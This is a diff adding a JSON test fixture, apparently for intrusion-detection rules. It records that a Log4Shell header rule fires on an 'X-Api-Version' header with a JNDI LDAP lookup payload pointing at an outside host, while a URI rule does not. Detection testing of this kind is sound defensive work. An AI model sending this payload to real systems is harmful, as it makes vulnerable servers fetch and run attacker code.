@@ -1,0 +1,6 @@
+{
+  "description": "X-Api-Version: ${jndi:ldap://203.0.113.9:1389/Exploit}. The header Log4Shell rule fires; the URI rule does not.",
+  "alerts": [
+    {"sid": 1000221, "kind": "alert", "src_ip": "203.0.113.9", "dst_ip": "192.0.2.80", "dst_port": 80, "count": [1, 1]}
+  ]
+}
